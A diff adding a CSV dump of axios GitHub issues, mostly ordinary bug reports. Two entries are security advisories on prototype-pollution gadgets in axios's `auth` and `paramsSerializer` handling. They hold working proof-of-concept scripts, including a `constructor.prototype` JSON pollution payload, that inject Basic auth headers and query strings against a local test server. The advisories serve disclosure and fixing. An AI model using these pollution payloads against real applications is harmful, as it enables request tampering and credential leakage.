@@ -1,0 +1,2207 @@
+type,issue_number,author,author_type,created_at,state,title,text
+issue_body,11105,bixie-enterprise[bot],Bot,2026-07-27T19:29:19Z,open,Fix prototype pollution in nested axios option objects (GHSA-7q8q-rj6j-mhjq),"## Summary
+
+Axios can consume inherited properties from nested request option objects when the JavaScript process already has a polluted `Object.prototype`.
+
+The top-level merged config is protected with a null prototype, but nested plain objects such as `auth` and `paramsSerializer` are cloned into ordinary objects. If application code passes placeholders such as `auth: {}` or `paramsSerializer: {}`, inherited `username`, `password`, `encode`, or `serialize` properties can influence outbound requests.
+
+## Impact
+
+This is reachable only when another component has already polluted `Object.prototype` and the application passes an affected nested axios option object.
+
+Confirmed impacts include silent injection of an `Authorization: Basic ...` header from inherited `username` and `password` values, and query-string tampering when inherited `paramsSerializer` fields are function-valued.
+
+The `auth` case requires only string-valued pollution. Full query-string replacement through `paramsSerializer.serialize` requires a function-valued pollution primitive; string-only pollution may still cause request failures or encoding changes through `encode`.
+
+This does not mean every axios request is affected. Requests that do not pass `auth`, do not pass `paramsSerializer`, or provide explicit own properties for the relevant nested fields are not affected by this specific gadget.
+
+## Affected Functionality
+
+Affected runtime functionality:
+
+- Node HTTP adapter Basic auth handling in `lib/adapters/http.js`.
+- Browser/fetch/XHR Basic auth handling through `lib/helpers/resolveConfig.js`.
+- Query serialization through `lib/helpers/buildURL.js`.
+- `axios.getUri()` when called with an affected `paramsSerializer` object.
+
+Affected config shapes:
+
+- `auth: {}` or an `auth` object missing own `username` and/or `password`.
+- `paramsSerializer: {}` or a `paramsSerializer` object missing own `encode` and/or `serialize`.
+
+Unaffected by this specific issue:
+
+- Requests with no `auth` property.
+- Requests with no `paramsSerializer` property.
+- Top-level polluted `auth` or `paramsSerializer` values in current hardened versions.
+
+## Technical Details
+
+`lib/core/mergeConfig.js` creates the top-level merged config with `Object.create(null)`, but nested object cloning still uses ordinary `{}` containers:
+
+```js
+} else if (utils.isPlainObject(source)) {
+  return utils.merge({}, source);
+}
+```
+
+Downstream code then reads nested fields without own-property checks.
+
+In `lib/helpers/resolveConfig.js`:
+
+```js
+btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))
+```
+
+In `lib/adapters/http.js`:
+
+```js
+const username = configAuth.username || '';
+const password = configAuth.password || '';
+auth = username + ':' + password;
+```
+
+In `lib/helpers/buildURL.js`:
+
+```js
+const _encode = (options && options.encode) || encode;
+const serializeFn = _options && _options.serialize;
+```
+
+## Proof of Concept of Attack
+
+```js
+import http from 'node:http';
+import axios from './index.js';
+
+const user = 'attacker';
+const pass = 'exfil';
+
+Object.defineProperty(Object.prototype, 'username', {
+  value: user,
+  configurable: true
+});
+
+Object.defineProperty(Object.prototype, 'password', {
+  value: pass,
+  configurable: true
+});
+
+Object.defineProperty(Object.prototype, 'serialize', {
+  value: () => 'polluted=1',
+  configurable: true
+});
+
+const server = http.createServer((req, res) => {
+  res.writeHead(200, { 'content-type': 'application/json' });
+  res.end(JSON.stringify({
+    authorization: req.headers.authorization || null,
+    url: req.url
+  }));
+});
+
+await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
+
+try {
+  const port = server.address().port;
+  const response = await axios.get(`http://127.0.0.1:${port}/demo`, {
+    auth: {},
+    paramsSerializer: {},
+    params: { unused: 'ignored' }
+  });
+
+  console.log(response.data);
+} finally {
+  await new Promise((resolve) => server.close(resolve));
+  delete Object.prototype.username;
+  delete Object.prototype.password;
+  delete Object.prototype.serialize;
+}
+```
+
+Observed result:
+
+```json
+{
+  ""authorization"": ""Basic YXR0YWNrZXI6ZXhmaWw="",
+  ""url"": ""/demo?polluted=1""
+}
+```
+
+## Workarounds
+
+If upgrading is not yet possible, avoid passing placeholder nested option objects.
+
+Remove `auth` entirely when Basic auth is not intended. For `paramsSerializer` objects, provide explicit own `encode` and `serialize` properties or remove `paramsSerializer` when custom serialization is not required.
+
+These workarounds only address this axios gadget. They do not remediate the separate prototype-pollution primitive that must already exist in the application process.
+
+## Touchpoint Files
+
+The following files need updates to fix this vulnerability:
+
+- `lib/core/mergeConfig.js`
+- `lib/helpers/resolveConfig.js`
+- `lib/adapters/http.js`
+- `lib/helpers/buildURL.js`
+
+## References
+
+- GHSA: https://github.com/axios/axios/security/advisories/GHSA-7q8q-rj6j-mhjq
+- PR: https://github.com/axios/axios/pull/11000
+- PR: https://github.com/axios/axios/pull/11001
+- Commit: https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d
+- Commit: https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2
+- Release: https://github.com/axios/releases/tag/v0.33.0
+- Release: https://github.com/axios/releases/tag/v1.18.0
+- Advisory: https://github.com/advisories/GHSA-7q8q-rj6j-mhjq"
+issue_body,11104,jieLi086,User,2026-07-27T11:48:54Z,open,"Incorrect Content-Length set when FormData contains a custom Readable stream (not a file stream, no httpVersion)","When sending a FormData body that includes a custom Node.js Readable stream (a stream that does not have a path property and is not an http.IncomingMessage), axios incorrectly sets a very small Content-Length header (only the multipart boundary overhead) instead of using Transfer-Encoding: chunked. This causes the request body to be truncated and the server to receive incomplete data.
+
+To Reproduce
+js
+const axios = require('axios');
+const FormData = require('form-data');
+const { Readable } = require('stream');
+
+// Create a custom readable stream (no path, no httpVersion)
+const stream = Readable.from(Buffer.alloc(1024 * 1024)); // 1MB of data
+const form = new FormData();
+form.append('file', stream, { filename: 'test.bin' });
+
+axios.post('http://httpbin.org/post', form, {
+  headers: form.getHeaders(),
+}).then(res => console.log(res.data)).catch(console.error);
+Observed behavior:
+The request is sent with Content-Length: ~271 (the multipart overhead) instead of Transfer-Encoding: chunked. The server only receives the first 271 bytes; the rest of the stream data is lost or the connection hangs.
+
+Expected behavior:
+Since the stream length cannot be determined, axios should not set a Content-Length header and should fall back to chunked transfer encoding, as it did in older versions (e.g., 1.1.3).
+
+Axios Version
+1.7.x (tested up to 1.19) – regression introduced after 1.1.3.
+
+Additional context
+The root cause is in the getLength / _trackLength logic. When a value is a Readable stream, it is considered measurable only if it has a path property (file stream) or is an HTTP response (value.readable && value.hasOwnProperty('httpVersion')). For any other stream, _trackLength sets valueLength to 0 and does not add it to _valuesToMeasure. Later, if _valuesToMeasure is empty, getLength immediately returns _overheadLength + _valueLength, which is just the boundary overhead. Axios then treats this as a valid, known length and sets Content-Length.
+
+This is a regression compared to axios 1.1.3, where no Content-Length was proactively calculated for FormData with streams, so the underlying HTTP layer correctly used chunked encoding.
+
+A possible fix would be: if any stream is encountered that cannot be measured, getLength should return null (or an error) to signal that the total length is unknown, forcing axios to send the request without Content-Length."
+issue_body,11103,bixie-enterprise[bot],Bot,2026-07-27T10:19:58Z,open,Security Alert: Prototype pollution auth subfields can inject Basic auth (GHSA-xj6q-8x83-jv6g),"## Summary
+
+Axios versions after the `GHSA-q8qp-cvcw-x6jj` fix still contain prototype-pollution read-side gadgets in Basic auth subfield handling. If a host application is already affected by prototype pollution and then makes an axios request with an own `auth` object that omits `username` or `password`, axios reads inherited `Object.prototype.username` and `Object.prototype.password` values and uses them to construct an outbound `Authorization: Basic ...` header.
+
+This does not mean axios itself pollutes prototypes. Exploitation requires a separate prototype-pollution primitive in the host process, plus an axios call pattern such as `auth: opts.auth || {}`.
+
+## Impact
+
+An attacker who can pollute `Object.prototype.username` and/or `Object.prototype.password` can influence the Basic auth header on affected axios requests that pass an empty or partial own `auth` object.
+
+The practical impact is outbound request tampering. The attacker can inject attacker-chosen Basic auth credentials, replace an existing `Authorization` header because axios removes it when `auth` is used, or cause downstream authorization failures.
+
+This should not be described as automatic credential exfiltration. In the minimal reproduced case, the Basic auth values are attacker-controlled values, not secrets read from axios. Credential disclosure requires an additional application-specific condition, such as a request destination observable by the attacker and a partial real auth object with a missing polluted subfield.
+
+## Affected Functionality
+
+Affected functionality:
+
+- Node HTTP adapter Basic auth handling in `lib/adapters/http.js`.
+- Browser, web worker, React Native, and fetch shared resolver Basic auth handling in `lib/helpers/resolveConfig.js`.
+- Requests where `config.auth` is an own object but `username` and/or `password` are absent own properties.
+
+Unaffected or not accepted as core impact:
+
+- Requests with no own `auth` object after `mergeConfig()`.
+- Requests with own `auth.username` and `auth.password` values.
+- Normal axios request flow for inherited top-level `params` / `paramsSerializer` after the null-prototype `mergeConfig()` hardening.
+- Attacker-controlled `paramsSerializer` functions from JSON-only prototype pollution, because JSON pollution cannot create functions. If attacker-controlled code can install functions in the process, that is outside axios’ runtime boundary.
+
+## Technical Details
+
+`mergeConfig()` returns a null-prototype top-level config object, which prevents top-level reads such as `config.auth` from inheriting polluted values. However, nested plain objects returned by `utils.merge()` still have `Object.prototype`.
+
+In `lib/adapters/http.js`, axios correctly reads the top-level `auth` value through `own('auth')`, but then reads subfields directly:
+
+```js
+const configAuth = own('auth');
+if (configAuth) {
+  const username = configAuth.username || '';
+  const password = configAuth.password || '';
+  auth = username + ':' + password;
+}
+```
+
+If the caller passes auth: {} and Object.prototype.username/password are polluted, those direct subfield reads walk the prototype chain.
+
+The same pattern exists in `lib/helpers/resolveConfig.js`:
+```js
+if (auth) {
+  headers.set(
+    'Authorization',
+    'Basic ' +
+      btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))
+  );
+}
+```
+
+The fix should guard `username` and `password` with `utils.hasOwnProp`, matching the proxy-auth pattern already used elsewhere.
+
+## Proof of Concept of Attack
+
+Safe local PoC against published `axios@1.16.1`:
+
+```js
+const http = require('node:http');
+const axios = require('axios');
+
+Object.prototype.username = 'victim-user';
+Object.prototype.password = 'victim-password-leaked';
+
+const server = http.createServer((req, res) => {
+  console.log({
+    url: req.url,
+    authorization: req.headers.authorization || null
+  });
+
+  res.end('{}');
+  server.close(() => {
+    delete Object.prototype.username;
+    delete Object.prototype.password;
+  });
+});
+
+server.listen(0, '127.0.0.1', async () => {
+  await axios.get(`http://127.0.0.1:${server.address().port}/api`, {
+    auth: {}
+  });
+});
+```
+
+Expected output:
+
+```json
+{
+  ""url"": ""/api"",
+  ""authorization"": ""Basic dmljdGltLXVzZXI6dmljdGltLXBhc3N3b3JkLWxlYWtlZA==""
+}
+```
+
+The base64 value decodes to `victim-user:victim-password-leaked`.
+
+## Workarounds
+Avoid passing empty or partial `auth` objects. Only set `auth` when the application has own username and password values.
+
+Applications that merge untrusted input should filter `__proto__`, `constructor`, and `prototype`, and should read optional user options with own-property checks rather than `opts.auth || {}`.
+
+Where a wrapper must materialize optional auth, use a null-prototype object or explicitly copy only own fields.
+
+<details>
+<summary>Original Report</summary>
+
+### Summary
+
+After [GHSA-q8qp-cvcw-x6jj](https://github.com/axios/axios/security/advisories/GHSA-q8qp-cvcw-x6jj) / [PR #10779](https://github.com/axios/axios/pull/10779) (shipped in `v1.15.2`) and the further proxy-side hardening in
+[PR #10833](https://github.com/axios/axios/pull/10833) (merged 2026-05-02), the **top-level** `config.auth` and the **proxy auth**sub-fields are correctly read via `utils.hasOwnProp`. The **regular request auth sub-fields** (`config.auth.username` and `config.auth.password`) and the **`config.params` / `config.paramsSerializer`** reads inside `resolveConfig.js` are still unguarded against a polluted `Object.prototype`.
+
+When a polluted host process makes an axios call with the common ""optional override"" pattern (`auth: opts.auth || {}` — an empty own `{}`), the sub-field reads `configAuth.username` and `configAuth.password` walk the prototype chain and return the attacker-controlled values. Same for `params` and `paramsSerializer`. The outbound HTTP request then carries an attacker-chosen `Authorization: Basic <base64>` header and an attacker-chosen querystring, leaking credentials and exfiltrating data to whichever host the request goes to (often attacker-influenced too — i.e. the amplifier is wired into many credential-stuffing chains).
+
+Reproduces against `axios` `main` HEAD (`34723be`, dated 2026-05-24)
+as well as the released `v1.16.1`.
+
+### Details
+
+**Three still-unguarded read sites** on `main` HEAD:
+
+**(1) `lib/adapters/http.js` lines 737–740** (Node http adapter):
+
+```js
+const configAuth = own('auth');         // ← top-level guard OK
+if (configAuth) {
+    const username = configAuth.username || '';   // ← reads .username on the inherited chain
+    const password = configAuth.password || '';   // ← reads .password on the inherited chain
+    auth = username + ':' + password;
+}
+```
+
+`own('auth')` correctly applies `hasOwnProp` to the top-level `auth`
+key. But once `configAuth` is the empty object the caller passed
+(`auth: {}`), `configAuth.username` walks the prototype chain and
+picks up `Object.prototype.username`.
+
+Contrast with the proxy-auth path that PR #10833 fixed (lines 322–324):
+
+```js
+const authUsername =
+    authIsObject && utils.hasOwnProp(proxyAuth, 'username') ? proxyAuth.username : undefined;
+const authPassword =
+    authIsObject && utils.hasOwnProp(proxyAuth, 'password') ? proxyAuth.password : undefined;
+```
+
+This is the exact pattern needed at lines 739–740 too.
+
+**(2) `lib/helpers/resolveConfig.js` lines 50 + 68** (xhr/fetch adapter shared resolver):
+
+```js
+const auth = own('auth');               // ← top-level guard OK
+...
+btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))
+//   ^ .username and .password read directly on `auth`, no hasOwnProp guard
+```
+
+Same shape — top-level guarded, sub-fields walk prototype.
+
+**(3) `lib/helpers/resolveConfig.js` lines 58–59** (params + paramsSerializer):
+
+```js
+newConfig.url = buildURL(
+    buildFullPath(baseURL, url, allowAbsoluteUrls),
+    config.params,            // ← direct read, not through own()
+    config.paramsSerializer   // ← direct read, not through own()
+);
+```
+
+This third site is already proposed for fix in **open** [PR #10922](https://github.com/axios/axios/pull/10922) by @Mohammad-Faiz-Cloud-Engineer (status: open, currently mergeable: false). That PR's `own('params')` / `own('paramsSerializer')` change is exactly correct; this report flags the auth sub-field sites that PR #10922 does **not** cover.
+
+### PoC
+
+This PoC contains zero direct `Object.prototype.x = y` writes. The
+pollution flows entirely from attacker-shaped JSON through a real
+deep-merge utility (`defaults-deep@0.2.4`, ~50k weekly downloads,
+still walks `constructor.prototype`). A hand-rolled deep merge —
+the canonical insecure backend pattern — exhibits the same pollution
+via `__proto__` and is more common in real codebases than any named
+utility.
+
+```js
+#!/usr/bin/env node
+'use strict';
+
+const http = require('node:http');
+const axios = require('axios');
+const defaultsDeep = require('defaults-deep');
+
+// Defensive: scrub any prior pollution
+const PROTO_KEYS = ['username', 'password', 'params', 'paramsSerializer'];
+function scrub() {
+  for (const k of PROTO_KEYS) {
+    try { delete Object.prototype[k]; } catch (_) {}
+  }
+}
+scrub();
+
+// 1) Attacker input — what JSON.parse(req.body) would yield from an HTTP POST
+const attackerBody = JSON.parse(`{
+  ""constructor"": {
+    ""prototype"": {
+      ""username"": ""victim-user"",
+      ""password"": ""victim-password-leaked"",
+      ""params"": {""leak"": ""ATTACKER_QUERY_TOKEN""}
+    }
+  }
+}`);
+
+// 2) Realistic application pattern: merge user options into defaults
+const appDefaults = { timeout: 5000 };
+defaultsDeep(appDefaults, attackerBody);
+//   After this line:
+//     Object.prototype.username  === ""victim-user""
+//     Object.prototype.password  === ""victim-password-leaked""
+//     Object.prototype.params    === { leak: ""ATTACKER_QUERY_TOKEN"" }
+
+// 3) Capture outbound request on a local listener
+const server = http.createServer((req, res) => {
+  console.log('=== captured outbound request ===');
+  console.log(JSON.stringify({
+    method: req.method,
+    url: req.url,
+    authorization: req.headers.authorization || null,
+  }, null, 2));
+  res.end('{}');
+  server.close();
+  scrub();
+});
+
+server.listen(0, '127.0.0.1', () => {
+  const port = server.address().port;
+
+  // 4) Realistic application wrapper: optional per-call overrides.
+  //    `auth: opts.auth || {}` is the common pattern — empty own object,
+  //    but inherited values walk the prototype chain.
+  function makeRequest(targetUrl, opts = {}) {
+    return axios.get(targetUrl, {
+      timeout: 5000,
+      auth: opts.auth || {},
+      params: opts.params || {},
+    });
+  }
+
+  makeRequest(`http://127.0.0.1:${port}/api/widget`).catch((e) => {
+    console.error('axios error:', e.message);
+    scrub();
+    process.exit(1);
+  });
+});
+```
+
+Reproduction:
+
+```bash
+mkdir /tmp/axios-poc && cd /tmp/axios-poc
+npm init -y
+npm install axios@1.16.1 defaults-deep@0.2.4
+node /path/to/poc.cjs
+```
+
+Captured output (verified against released `1.16.1` AND against
+`main` at `34723be`, 2026-05-24):
+
+```json
+{
+  ""method"": ""GET"",
+  ""url"": ""/api/widget?leak=ATTACKER_QUERY_TOKEN"",
+  ""authorization"": ""Basic dmljdGltLXVzZXI6dmljdGltLXBhc3N3b3JkLWxlYWtlZA==""
+}
+```
+
+`dmljdGltLXVzZXI6dmljdGltLXBhc3N3b3JkLWxlYWtlZA==` base64-decodes to
+`victim-user:victim-password-leaked`. The querystring carries
+`?leak=ATTACKER_QUERY_TOKEN`, which can be a full data-exfil channel
+in real chains (CSRF token, session cookie via `req.headers`, etc.).
+
+### Impact
+
+- **Credential exfiltration** via Basic auth header on the outbound
+  request. If the request URL is attacker-influenced too (common in
+  webhook/oauth-callback patterns), the credentials flow directly to
+  the attacker. If not, they flow to the legitimate destination but
+  expose victim credentials in any logs / proxies along the path.
+- **Outbound request-shape control** via inherited `params` /
+  `paramsSerializer`. With `paramsSerializer` polluted to an attacker
+  function, axios will execute that function with each `params` 
+  invocation — same-process code execution from a pollution primitive.
+- **Amplifier framing** is still correct. The application-side
+  precondition is ""deep-merges attacker JSON into a config object
+  without `__proto__`/`constructor` filtering, then uses the empty-
+  fallback wrapper `auth: opts.auth || {}` / `params: opts.params || {}`.
+  Both halves are very common in real codebases (we tested
+  `defaults-deep`, hand-rolled merges, and several lodash-family
+  utilities; many still pollute).
+- **CWE-1321** (Improperly Controlled Modification of Object Prototype
+  Attributes — amplifier sink).
+
+### Proposed fix
+
+Two-line change in `http.js`, matching the proxy-auth pattern PR
+#10833 already established:
+
+```diff
+--- a/lib/adapters/http.js
++++ b/lib/adapters/http.js
+@@ -737,8 +737,10 @@
+       const configAuth = own('auth');
+       if (configAuth) {
+-        const username = configAuth.username || '';
+-        const password = configAuth.password || '';
++        const username = utils.hasOwnProp(configAuth, 'username') ? (configAuth.username || '') : '';
++        const password = utils.hasOwnProp(configAuth, 'password') ? (configAuth.password || '') : '';
+         auth = username + ':' + password;
+       }
+```
+
+Same pattern in `resolveConfig.js`:
+
+```diff
+--- a/lib/helpers/resolveConfig.js
++++ b/lib/helpers/resolveConfig.js
+@@ -64,7 +64,11 @@
+   // HTTP basic authentication
+   if (auth) {
++    const authUsername = utils.hasOwnProp(auth, 'username') ? (auth.username || '') : '';
++    const authPassword = utils.hasOwnProp(auth, 'password') ? auth.password : '';
+     headers.set(
+       'Authorization',
+       'Basic ' +
+-        btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))
++        btoa(authUsername + ':' + (authPassword ? encodeUTF8(authPassword) : ''))
+     );
+   }
+```
+
+The **`params` / `paramsSerializer`** half is already handled by open
+PR #10922's `own('params')` / `own('paramsSerializer')` change — that
+PR should be rebased / merged.
+
+### Relationship to recent prototype-pollution work
+
+Same vulnerability class as the existing public hardening, just at
+sub-field granularity:
+
+- [GHSA-q8qp-cvcw-x6jj](https://github.com/axios/axios/security/advisories/GHSA-q8qp-cvcw-x6jj) / [PR #10779](https://github.com/axios/axios/pull/10779) — `mergeConfig` direct-key reads. **Fixed in v1.15.2.**
+- [PR #10761](https://github.com/axios/axios/pull/10761) — `mergeDirectKeys` `in` → `hasOwnProp`. **Fixed in v1.15.x.**
+- [PR #10833](https://github.com/axios/axios/pull/10833) — proxy `auth.username/password` sub-fields. **Fixed post-1.16.1.**
+- [PR #7413](https://github.com/axios/axios/pull/7413) — `formDataToJSON` defense-in-depth. **Fixed post-1.16.1.**
+- [PR #10901](https://github.com/axios/axios/pull/10901) — `socketPath` guard. **Merged 2026-05-24.**
+- [PR #10922 (OPEN)](https://github.com/axios/axios/pull/10922) — `params` / `paramsSerializer` `own()` guard. **Proposed; not merged.**
+
+This report adds: regular-request `auth.username` / `auth.password`
+sub-field reads in both the http adapter (lines 737–740) and
+resolveConfig.js (line 68).
+
+### Reporter notes
+
+- Reported as part of a small peer-review bundle of runtime security
+  findings. The bundle's public tracking entry (without the working
+  exploit chain) is at
+  [`georgian-io/package-runtime-security-findings/advisories/AXIOS-002-prototype-pollution-config-fields.md`](https://github.com/georgian-io/package-runtime-security-findings/blob/main/advisories/AXIOS-002-prototype-pollution-config-fields.md).
+- I'm happy to submit the patch as a PR if that helps. Or, if you'd
+  prefer to fold this into open PR #10922 (whose author is actively
+  responding to comments), please let me know and I'll coordinate.
+- Threat model honesty: this is **amplifier framing** — exploitation
+  requires a separate prototype-pollution primitive elsewhere in the
+  host process. That's how the existing GHSA-q8qp-cvcw-x6jj and
+  PR #10833 were framed too, so the precedent for ""in-scope as a hardening fix"" is established.
+</details>
+
+---
+
+**Alert Details:**
+- Alert Number: 188
+- Package: axios (npm)
+- Vulnerable Versions: >= 1.15.2, < 1.18.0
+- First Patched Version: 1.18.0
+- Security Advisory: GHSA-xj6q-8x83-jv6g
+
+**Touchpoint Files Requiring Updates:**
+- `lib/adapters/http.js` (lines 737–740)
+- `lib/helpers/resolveConfig.js` (lines 50, 58–59, 68)"
+issue_body,11093,ari-token-security,User,2026-07-22T08:04:17Z,open,"XHR adapter resolves navigation-canceled requests as success on Firefox 152+ (status 0, empty body)","## Describe the issue
+
+axios contradicts itself about what `status === 0` means, and Firefox 152 made the disagreement reachable.
+
+The XHR adapter has the rule right, and scopes the `file:` exception properly:
+
+```js
+// lib/adapters/xhr.js, the onreadystatechange fallback
+// The request errored out and we didn't get a response, this will be
+// handled by onerror instead
+// With one exception: request that using file: protocol, most browsers
+// will return status as 0 even though it's a successful request
+if (request.status === 0 && !(request.responseURL && request.responseURL.startsWith('file:'))) {
+  return;
+}
+```
+
+`settle()` does not scope it at all. It resolves any status-0 response as a success, on any scheme:
+
+```js
+// lib/core/settle.js
+if (!response.status || !validateStatus || validateStatus(response.status)) {
+  resolve(response);
+}
+```
+
+The catch is where that adapter guard lives. It sits in the `onreadystatechange` fallback, which only runs when `'onloadend' in request` is false, and that is never the case in a current browser. Every evergreen browser takes the `onloadend` path instead, which has no equivalent check, so the unscoped version in `settle()` is the one that actually runs.
+
+For about six years this did not matter, because browsers always fired `error` or `abort` before `loadend` on a failed or canceled XHR. `onabort`/`onerror` would reject and set `request = null`, and `onloadend` would bail on `if (!request) return` before `settle()` ever ran.
+
+Firefox 152 changed that. [Bugzilla 1505389](https://bugzilla.mozilla.org/show_bug.cgi?id=1505389) made navigation-canceled XHRs fire only `readystatechange` and `loadend`, with no `abort` and no `error`. The patch says it outright:
+
+> Don't make navigation block XHR and call onerror/abort
+>
+> Fires readystatechange and loadend intead of abort
+
+It is intentional and it has been upstreamed. Mozilla landed a conformance test in web-platform-tests ([wpt#59603](https://github.com/web-platform-tests/wpt/pull/59603), `xhr/abort-during-navigation.window.js`) asserting that `error`, `abort` and `load` must not fire. Chrome already fires nothing and passes it. Safari still fires `abort` and would fail it. So this looks like where the platform is heading rather than a Firefox quirk that will get reverted.
+
+Note also that `!response.status` is evaluated before `validateStatus`, so this cannot be worked around with config.
+
+## Example code
+
+Any request that is in flight when the user navigates away, on Firefox 152 or later:
+
+```js
+// Page navigates (link click, location assignment, reload) while this is pending.
+const { data } = await axios.get('/api/things');
+// Firefox <= 151: rejects with ECONNABORTED, because the adapter saw an abort event.
+// Firefox >= 152: RESOLVES, with status 0 and data === ''.
+// Anything parsing or validating `data` then fails on an empty string.
+```
+
+Reproducible without a browser, by driving the real xhr adapter with a stub `XMLHttpRequest`. The only difference between the two runs is whether `error` fires:
+
+```js
+let SEQUENCE = [];
+globalThis.XMLHttpRequest = class {
+  constructor() {
+    this.readyState = 0; this.status = 0; this.statusText = '';
+    this.responseText = ''; this.response = ''; this.timeout = 0;
+    this.onloadend = this.onabort = this.onerror = this.ontimeout = this.onreadystatechange = null;
+  }
+  open() {} setRequestHeader() {} abort() {} getAllResponseHeaders() { return ''; }
+  send() {
+    setImmediate(() => {
+      this.readyState = 4;
+      for (const ev of SEQUENCE) this[`on${ev}`]?.call(this, { type: ev });
+    });
+  }
+};
+const { default: axios } = await import('axios');
+
+for (const [label, seq] of [
+  ['error precedes loadend (every browser before FF152)', ['readystatechange', 'error', 'loadend']],
+  ['loadend only        (Firefox >= 152 nav-cancel)     ', ['readystatechange', 'loadend']],
+]) {
+  SEQUENCE = seq;
+  const out = await axios.get('https://example.com/x', { adapter: 'xhr' })
+    .then((r) => `RESOLVED status=${r.status} data=${JSON.stringify(r.data)}`)
+    .catch((e) => `rejected  ${e.code}`);
+  console.log(label, '->', out);
+}
+```
+
+Output on axios 1.18.1:
+
+```
+error precedes loadend (every browser before FF152) -> rejected  ERR_NETWORK
+loadend only        (Firefox >= 152 nav-cancel)     -> RESOLVED status=0 data=""""
+```
+
+Confirmed in a real Firefox 153.0 as well, using the same iframe technique as Mozilla's WPT test. An in-flight XHR is canceled by a document navigation and the surviving parent records the events plus axios's outcome:
+
+```json
+{""ua"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:153.0) Gecko/20100101 Firefox/153.0"",
+ ""events"":[""loadend(st=0)""],
+ ""firedAbort"":false, ""firedError"":false, ""firedLoad"":false,
+ ""axios"":{""outcome"":""RESOLVED"",""status"":0,""dataType"":""string"",""data"":""\""\""""}}
+```
+
+## Expected behavior
+
+A request that never received a response should reject, as it did on Firefox 151 and as it still does in every other engine. Reads over `file:`, which some environments report as status 0 on success, should keep resolving.
+
+## Actual behavior
+
+It resolves as a success carrying `status: 0` and `data: ''`. No error is thrown, so the failure surfaces later as a parsing or validation error on an empty string, far from its cause.
+
+## Environment
+
+- Axios version: 1.18.1 (behavior present since 0.19.1, when #2470 landed)
+- Adapter: xhr
+- Runtime: Firefox 152 and later, verified on Firefox Developer Edition 153.0. Chrome and Safari are unaffected today, though Safari changes if it adopts wpt#59603
+- OS: macOS 15
+- Additional context: browser build, default adapter, no custom `validateStatus`
+
+:surfer: Investigated and written with AI assistance, reviewed before posting.
+"
+issue_body,11070,eeshsaxena,User,2026-07-08T19:44:45Z,open,InterceptorManager sparse array growth,"### Describe the bug
+
+`InterceptorManager` stores interceptors in a plain array (`this.handlers`). When `eject(id)` is called, it sets the slot to `null` rather than removing it:
+
+In applications that frequently add and remove interceptors (e.g., per-request auth interceptors, retry logic), this causes unbounded growth of the `handlers` array with `null` entries. Every request dispatch must filter these out.
+
+### Steps to reproduce
+
+const instance = axios.create();
+
+for (let i = 0; i < 10_000; i++) {
+  const id = instance.interceptors.request.use((cfg) => cfg);
+  instance.interceptors.request.eject(id);
+}
+
+// handlers array now has 10,000 null slots
+console.log(instance.interceptors.request.handlers.length); // 10000
+
+### Expected behavior
+
+The `handlers` array should not grow unboundedly. Ejected interceptors should not leave behind `null` tombstones that accumulate over the lifetime of an axios instance.
+
+### Suggested fix
+
+Replace the Array with a Map keyed by an incrementing integer ID:
+
+constructor() {
+  this.handlers = new Map();
+  this._idCounter = 0;
+}
+
+use(fulfilled, rejected, options) {
+  const id = this._idCounter++;
+  this.handlers.set(id, {
+    fulfilled,
+    rejected,
+    synchronous: options?.synchronous ?? false,
+    runWhen: options?.runWhen ?? null,
+  });
+  return id;
+}
+
+eject(id) {
+  this.handlers.delete(id);
+}
+
+This is a non-breaking change — the returned ID is still a number and eject(id) still works the same way from the caller's perspective.
+
+### Environment
+
+- axios version: v1.x (latest)
+- Affected file: lib/core/InterceptorManager.js"
+issue_body,11066,akahoshi1421,User,2026-07-05T16:08:19Z,open,proposal: align 413 naming with RFC 9110 (PayloadTooLarge → ContentTooLarge),"## Describe the issue
+
+RFC 9110 renamed HTTP status 413 from
+""Payload Too Large"" to ""Content Too Large"". In axios, HttpStatusCode
+enum(`index.d.cts`, `index.d.ts`) and `lib/helpers/HttpStatusCode.js` still uses it as `PayloadTooLarge`:
+
+- https://github.com/axios/axios/blob/v1.x/index.d.ts#L212
+- https://github.com/axios/axios/blob/v1.x/index.d.cts#L277
+- https://github.com/axios/axios/blob/v1.x/lib/helpers/HttpStatusCode.js#L38
+
+I'd like to align enum and `lib/helpers/HttpStatusCode.js` with the RFC 9110, but it is a breaking change, so I'd like to agree on the approach before opening a PR.
+
+Options:
+1. **Breaking rename**: replace `PayloadTooLarge` with `ContentTooLarge`.
+   Cleanest, but it is a breaking change.
+2. **Add alias**:  keep `PayloadTooLarge` and add `ContentTooLarge` (both 413).
+   Not breaking change, but probably there is no precedent.
+3. **Leave it as is.**
+
+Which direction do you think is better?"
+issue_body,11052,webcarrot,User,2026-06-30T06:39:02Z,closed,Do not include references to unpublished source map files,"Due to changes in https://github.com/axios/axios/pull/10939 axios package no longer include some of the source files maps.
+
+At the same time, remains such as:
+
+```js
+//# sourceMappingURL=axios.cjs.map
+```
+
+survived and affects tools like [webpack](https://webpack.js.org/configuration/module/#ruleextractsourcemap) for example:
+
+```
+WARNING in ../../node_modules/axios/dist/browser/axios.cjs
+Module Warning: Failed to parse source map. ENOENT: no such file or directory, open '/xxx/node_modules/axios/dist/browser/axios.cjs.map'
+```
+
+# Solution:
+
+1. Remove `-m` from `package.json` build script:
+```json
+  ""scripts"": {
+    ""build"": ""gulp clear && cross-env NODE_ENV=production rollup -c""
+```
+2. Add `sourcemap: minified` in `rollup.config.js`:
+```js
+// ✂️
+  const build = ({ minified }) => ({
+    input: namedInput,
+    ...config,
+    output: {
+      ...config.output,
+      file: `${path.dirname(file)}/${basename}.${(minified ? ['min', ...extArr] : extArr).join('.')}`,
+      sourcemap: minified // here
+    }
+// ✂️
+```"
+issue_body,11050,JSap0914,User,2026-06-30T04:08:33Z,closed,bug(AxiosHeaders): parseTokens returns quoted-string values with surrounding DQUOTE characters (RFC 9110 §5.6.4 violation),"## Bug Description
+
+`AxiosHeaders.get(name, true)` internally calls `parseTokens` to split a structured header value into its token/parameter pairs. When a parameter value is a **quoted-string** (wrapped in `""""`) as permitted by RFC 9110 §5.6.4, the double-quote delimiters are incorrectly included in the returned value.
+
+## Reproduction
+
+```js
